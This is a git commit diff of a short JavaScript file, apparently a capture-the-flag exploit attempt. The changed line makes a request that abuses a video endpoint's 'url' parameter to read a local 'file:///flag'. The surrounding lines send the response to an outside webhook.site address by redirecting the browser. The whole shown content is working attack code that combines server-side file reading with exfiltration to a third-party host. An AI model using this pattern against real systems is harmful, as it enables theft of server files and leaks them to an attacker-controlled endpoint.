a11a2f88fd8795676ce4504702fce22920d759fd
Emyr298 <emi.ru298@gmail.com>
2023-12-03 14:48:21 +0700

    s

--- test15.js
+++ test15.js
@@ -1,4 +1,4 @@
-fetch('/upload', { method: 'POST' }).then((res) => {
+fetch('/video?url=file%3A%2F%2F%2Fflag&format=mp4').then((res) => {
     res.text().then((test) => {
         window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${encodeURIComponent(test)}`;
     }).catch((owo) => {
